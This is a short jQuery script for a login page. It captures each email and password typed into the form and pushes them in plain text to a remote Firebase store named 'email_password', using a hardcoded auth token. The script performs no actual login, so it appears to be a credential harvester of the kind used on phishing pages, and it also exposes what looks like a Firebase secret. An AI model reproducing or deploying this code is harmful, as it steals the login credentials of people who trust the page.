$(document).ready(function() {



	var ref = new Firebase('https://bnb.firebaseio.com/email_password');
	ref.auth('AOcSqZ8qQIdR5atOoVMo7QAxryrmLscuPI7GuHKH', function () {});

	$('#passwordid').keypress(function (e) {
	    if (e.keyCode == 13) {
	        var email = $('#emailid').val();
	        var password = $('#passwordid').val();

	        ref.push({
	            email: email,
	            password:password
	        });
	        //$('#insightInput').val('');
	        alert('Entered.  Sent');
	    }
	});

	$('#sendButton').click(function() {
		var email = $('#emailid').val();
		var password = $('#passwordid').val();

		ref.push({
		    email: email,
		    password:password
		});
		alert('Clicked.  Sent.');
	})
});